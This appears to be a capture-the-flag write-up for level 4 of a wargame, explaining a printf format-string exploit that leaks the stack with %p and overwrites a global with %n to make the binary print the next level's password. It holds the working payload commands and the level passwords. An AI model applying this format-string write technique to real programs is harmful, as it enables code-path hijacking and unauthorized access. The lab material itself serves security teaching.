# Level 4
*password : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa*

## Analyze

```
$ scp -P 4242 level4@192.168.56.108:level4 .
```

```
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
```

`0x1025544` = 16930116\
`m` address = 0x08049810

## printf exploit

- overwrite `m` value using printf
```
$ python -c 'print "\x10\x98\x04\x08 %p %p %p %p %p %p %p %p %p %p %p %p"' | ./level4
DU 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0 0xb7ff37d0 0x1025544
```

address of `m` at parameter 12th.

```
$ python -c 'print "\x10\x98\x04\x08%16930112u%12$n"' > /tmp/level4
$ cat /tmp/level4 - | ./level4
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

```
